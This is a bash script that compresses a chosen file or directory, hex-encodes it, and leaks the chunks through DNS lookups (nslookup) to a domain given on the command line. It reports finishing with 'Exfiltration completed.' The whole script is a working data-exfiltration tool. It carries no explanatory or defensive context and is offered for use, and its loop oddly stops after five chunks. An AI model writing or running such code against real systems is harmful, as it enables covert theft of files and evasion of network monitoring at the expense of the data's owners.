#!/bin/bash

# Function to display usage instructions
usage() {
    echo "Usage: $0 -f <file_path> -d <domain>"
    exit 1
}

# Parse command-line arguments
while getopts "f:d:" opt; do
    case "${opt}" in
        f) FILE_PATH=${OPTARG} ;;
        d) DOMAIN=${OPTARG} ;;
        *) usage ;;
    esac
done

# Ensure required parameters are provided
if [[ -z "$FILE_PATH" || -z "$DOMAIN" ]]; then
    usage
fi

# Check if file exists
if [[ ! -f "$FILE_PATH" && ! -d "$FILE_PATH" ]]; then
    echo "[-] Error: File '$FILE_PATH' not found."
    exit 1
fi

# Read file and send chunks via DNS
echo "[+] Sending file: $FILE_PATH in chunks to $DOMAIN"

tar -czf - $FILE_PATH|./xxd -p >data

counter=0
for dat in $(cat data)
do
    ./nslookup $dat.${DOMAIN}
    ((counter ++))
    if [[ counter -eq 5 ]]
    then
        break
    fi
done > /dev/null 2>&1

echo "[+] Exfiltration completed."
